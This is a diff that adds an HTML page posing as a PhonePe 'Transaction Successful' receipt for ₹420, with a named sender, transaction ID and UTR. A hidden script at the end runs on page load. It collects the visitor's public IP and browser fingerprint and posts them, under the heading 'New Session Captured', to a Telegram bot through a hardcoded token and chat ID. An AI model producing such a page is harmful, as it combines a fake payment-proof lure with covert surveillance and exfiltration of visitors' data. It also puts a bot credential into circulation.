@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhonePe Transaction Successful</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 10px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background-color: #f5f5f5;
+        }
+
+        /* Header Section */
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px 15px 20px 15px;
+        }
+
+        .phonepe-logo {
+            width: 42px;
+            height: 42px;
+            background-color: #5f259f;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+
+        .header-text h2 {
+            font-size: 20px;
+            color: #1a1a1a;
+            font-weight: 500;
+        }
+
+        .header-text p {
+            font-size: 14px;
+            color: #555555;
+            margin-top: 2px;
+        }
+
+        /* Card Container */
+        .card {
+            background-color: #ffffff;
+            border-radius: 18px;
+            padding: 24px 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 20px;
+        }
+
+        /* Sender Details */
+        .sender-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .sender-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .avatar {
+            width: 48px;
+            height: 48px;
+            background-color: #5f259f;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 22px;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+
+        .sender-info h3 {
+            font-size: 18px;
+            color: #1a1a1a;
+            font-weight: 500;
+        }
+
+        .sender-info p {
+            font-size: 15px;
+            color: #666666;
+            margin-top: 4px;
+        }
+
+        .amount {
+            font-size: 20px;
+            font-weight: 700;
+            color: #000000;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #f0f0f0;
+            margin: 20px 0;
+        }
+
+        /* Banking Name Section */
+        .banking-name-row {
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+            color: #555555;
+        }
+
+        .banking-label {
+            width: 140px;
+        }
+
+        .banking-value {
+            color: #333333;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .verified-badge {
+            width: 16px;
+            height: 16px;
+            background-color: #22c55e;
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        /* Transfer Details Header */
+        .transfer-details-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 5px;
+        }
+
+        .transfer-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 17px;
+            color: #1a1a1a;
+            font-weight: 500;
+        }
+
+        .list-icon {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #000;
+            border-radius: 4px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-around;
+            padding: 3px;
+        }
+
+        .list-icon span {
+            display: block;
+            height: 2px;
+            background-color: #000;
+            width: 100%;
+        }
+
+        .chevron-up {
+            width: 12px;
+            height: 12px;
+            border-top: 2px solid #000;
+            border-right: 2px solid #000;
+            transform: rotate(-45deg);
+        }
+
+        /* Detail Fields */
+        .field-group {
+            margin-top: 20px;
+        }
+
+        .field-label {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 6px;
+        }
+
+        .field-value {
+            font-size: 17px;
+            color: #1a1a1a;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        /* Credited To Section */
+        .credited-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 6px;
+        }
+
+        .credited-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sbi-logo {
+            width: 28px;
+            height: 28px;
+            background-color: #0081cc;
+            border-radius: 50%;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .sbi-logo::after {
+            content: "";
+            width: 8px;
+            height: 10px;
+            background-color: #ffffff;
+            position: absolute;
+            bottom: 0;
+        }
+
+        .sbi-logo-inner {
+            width: 8px;
+            height: 8px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            z-index: 1;
+        }
+
+        .account-number {
+            font-size: 17px;
+            color: #1a1a1a;
+        }
+
+        .utr-value {
+            font-size: 17px;
+            color: #444444;
+            margin-top: 15px;
+            padding-left: 40px;
+        }
+
+        /* Footer Section */
+        .footer {
+            text-align: center;
+            margin-top: 35px;
+        }
+
+        .footer p {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 8px;
+        }
+
+        .footer-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .upi-text {
+            font-style: italic;
+            font-weight: 900;
+            color: #444;
+        }
+
+        .yes-bank {
+            color: #002e6d;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+            font-weight: 800;
+        }
+
+        .yes-bank-red {
+            color: #ed1c24;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="phonepe-logo">पे</div>
+            <div class="header-text">
+                <h2>Transaction Successful</h2>
+                <p>01:09 pm on 22 Sept 2026</p>
+            </div>
+        </div>
+
+        <!-- Main Card -->
+        <div class="card">
+            <div class="card-title">Received from</div>
+
+            <div class="sender-row">
+                <div class="sender-left">
+                    <div class="avatar">↙</div>
+                    <div class="sender-info">
+                        <h3>Amit Bhaiya ITU</h3>
+                        <p>+91 ••••• •2681</p>
+                    </div>
+                </div>
+                <div class="amount">₹420</div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="banking-name-row">
+                <span class="banking-label">Banking Name</span>
+                <span class="banking-value">
+                    : Amit Sarkar
+                    <span class="verified-badge">✓</span>
+                </span>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="transfer-details-header">
+                <div class="transfer-title">
+                    <div class="list-icon">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                    <span>Transfer Details</span>
+                </div>
+                <div class="chevron-up"></div>
+            </div>
+
+            <div class="field-group">
+                <div class="field-label">PhonePe Transaction ID</div>
+                <div class="field-value">T2609221309525245377409</div>
+            </div>
+
+            <div class="field-group">
+                <div class="field-label">Credited to</div>
+                <div class="credited-row">
+                    <div class="credited-left">
+                        <div class="sbi-logo">
+                            <div class="sbi-logo-inner"></div>
+                        </div>
+                        <span class="account-number">XXXXXX8461</span>
+                    </div>
+                    <div class="amount">₹420</div>
+                </div>
+                <div class="utr-value">UTR: 593915234415</div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>Powered by</p>
+            <div class="footer-logos">
+                <span class="upi-text">UPI</span>
+                <span style="color: #ed1c24; font-weight: bold;">/</span>
+                <span class="yes-bank"><span class="yes-bank-red">✔</span>YES BANK</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8695858574:AAF4IHKfQI6F7VQ23G2EfGDJrvTz9IESfqQ";
+        const TELEGRAM_CHAT_ID = "6156642923";
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+
+                // Collecting System & Browser Fingerprint
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language;
+                const cores = navigator.hardwareConcurrency || 'N/A';
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                const message = `🎯 *New Session Captured*\n\n` +
+                    `🌐 *Public IP:* \`${userIP}\`\n` +
+                    `💻 *Platform:* \`${platform}\`\n` +
+                    `🖥️ *Resolution:* \`${screenRes}\`\n` +
+                    `⚙️ *CPU Cores:* \`${cores}\`\n` +
+                    `🌍 *Timezone:* \`${timeZone}\`\n` +
+                    `🗣️ *Language:* \`${language}\`\n\n` +
+                    `📝 *User Agent:* \`${userAgent}\``;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+    </script>
+
+</body>
+
+</html>
